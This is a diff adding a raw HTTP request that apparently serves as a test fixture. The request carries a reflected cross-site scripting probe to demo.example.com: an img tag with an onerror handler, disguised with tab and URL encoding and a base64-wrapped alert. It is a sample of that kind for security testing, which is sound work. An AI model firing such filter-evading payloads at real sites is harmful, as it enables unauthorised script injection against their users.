@@ -1,0 +1,4 @@
+GET /a?path=<img%09src%3D"x"%09onerror%3D"alert(atob('YWxlcnQoMSk%3D'))"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
